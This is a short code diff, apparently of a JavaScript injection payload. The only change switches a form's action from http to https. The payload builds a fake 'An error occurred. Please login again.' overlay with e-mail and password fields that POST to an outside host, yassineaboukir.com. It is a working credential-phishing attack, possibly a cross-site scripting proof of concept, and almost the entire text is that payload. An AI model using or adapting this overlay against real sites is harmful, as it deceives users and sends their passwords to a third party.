@@ -3,7 +3,7 @@ var html = `
 </div>
 <div id=\"form\" style=\"position: absolute; z-index: 150; font-family: Arial; background-color: #ffffff; width: 300px; height: 185px; top: 50%; left: 40%; padding: 10px\">
     <p>An error occurred. Please login again.</p>
-    <form method=\"POST\" action=\"http://yassineaboukir.com/\">
+    <form method=\"POST\" action=\"https://yassineaboukir.com/\">
         <p>E-mail <input type=\"text\" name=\"email\"></p>
         <p>Password <input type=\"password\" name=\"password\"></p>
         <p><input type=\"submit\" value=\"Login\"></p>
